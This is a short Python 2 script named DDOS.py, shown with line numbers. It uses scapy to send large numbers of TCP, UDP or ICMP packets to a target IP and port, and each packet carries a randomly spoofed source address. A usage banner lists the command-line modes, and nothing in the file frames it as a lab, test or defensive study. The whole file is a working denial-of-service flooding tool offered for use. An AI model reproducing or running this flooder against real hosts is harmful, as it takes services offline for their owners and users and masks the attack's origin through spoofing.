01
# DDOS.py
02
# -*- coding:utf-8 -*-
03
import socket
04
import random
05
import sys
06
import threading
07
from scapy.all import *
08
 
09
usage ="""############# HELP #################
10
python DDOS.py tcp  ip port flag count
11
python DDOS.py udp  ip port count
12
python DDOS.py icmp ip count
13
####################################"""
14
 
15
def SpoofIP():
16
    return "%i.%i.%i.%i"%(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
17
 
18
def SpoofPort():
19
    return "%i"%(random.randint(1,254))
20
 
21
def TCPPacket(data):
22
    #print data
23
    src_ip      = SpoofIP()
24
    src_port    = SpoofPort()
25
    network_layer   = IP(src=src_ip , dst=data[0])
26
    transport_layer = TCP(sport=int(src_port) , dport=int(data[1]) , flags=str(data[2]))
27
    print "TCP -> SRC IP : {} DST IP : {} SRC PORT : {} DST PORT : {} FLAG : {}".format(src_ip.ljust(15," ") , data[0] , str(src_port).ljust(5 ," ") , data[1] , data[2])
28
    send(network_layer/transport_layer,verbose=False)
29
 
30
def UDPPacket(data):
31
    src_ip      = SpoofIP()
32
    src_port    = SpoofPort()
33
    network_layer   = IP(src=src_ip , dst=data[0])
34
    transport_layer = UDP(sport=int(src_port) , dport=int(data[1]))
35
    print "UDP -> SRC IP : {} DST IP : {} SRC PORT : {} DST PORT : {}".format(src_ip.ljust(15," ") , data[0] , str(src_port).ljust(5 ," ") , data[1])
36
    send(network_layer/transport_layer,verbose=False)
37
 
38
def ICMPPacket(data):
39
    src_ip      =  SpoofIP()
40
    src_port    =  SpoofPort()
41
    network_layer   =  IP(src=src_ip , dst=data[0])/ICMP()
42
    print "ICMP -> SRC IP : {} DST IP : {} ".format(src_ip.ljust(15," "),data[0])
43
 
44
    send(network_layer,verbose=False)
45
if __name__ == "__main__":
46
    if len(sys.argv) < 2 or len(sys.argv)> 6:
47
        print usage
48
        sys.exit(1)
49
    else:
50
        tmp = sys.argv[1:]
51
        if   str(tmp[0]).lower() == "tcp" and len(tmp) == 5:
52
            tmp = tmp[1:]
53
            for i in range(int(tmp[3])):
54
                TCPPacket(tmp)
55
 
56
        elif str(tmp[0]).lower() == "udp" and len(tmp) == 4:
57
            tmp = tmp[1:]
58
            for i in range(int(tmp[2])):
59
                UDPPacket(tmp)
60
 
61
        elif str(tmp[0]).lower() == "icmp" and len(tmp) == 3:
62
            tmp = tmp[1:]
63
            for i in range(int(tmp[1])):
64
                ICMPPacket(tmp)
65
 
66
        else:
67
            print usage
68
            sys.exit(1)
